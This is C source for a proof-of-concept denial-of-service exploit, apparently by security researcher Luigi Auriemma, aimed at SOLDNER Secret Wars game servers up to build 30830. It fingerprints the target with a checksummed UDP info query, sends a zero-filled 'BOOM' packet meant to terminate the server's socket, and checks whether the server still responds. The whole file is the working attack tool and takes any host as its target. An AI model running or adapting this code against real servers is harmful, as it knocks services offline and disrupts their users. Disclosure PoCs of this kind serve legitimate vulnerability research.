int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ],
            info[] =
                "\x00\x00"
                "\x02\x00\x00\x00\x00"
                "\x0A"      // size
                "\x05\x00"
                "\x0A"      // size, same of before
                "WING"
                "\x00\x00"  // build version (leave it empty)
                "\x00";


    setbuf(stdout, NULL);

    fputs("\n"
        "SOLDNER Secret Wars <= 30830 socket termination "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: [email protected]\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- check server:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    *(u_short *)info = crc16(info + 2, sizeof(info) - 3);
    SEND(info, sizeof(info) - 1);
    RECV;

    if(memcmp(buff + 11, "WING", 4)) {
        fputs("\nAlert: the server doesn't seem a valid Soldner server\n", stdout);
    }
    printf("  Build version   %d\n", ntohs(*(u_short *)(buff + 18)));

    printf("\n- send BOOM packet (%d bytes)\n", BOOMSZ);
    memset(buff, 0x00, BOOMSZ);
    SEND(buff, BOOMSZ);

    fputs("- check server again:\n", stdout);
    SEND(info, sizeof(info) - 1);
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);

    return(0);
}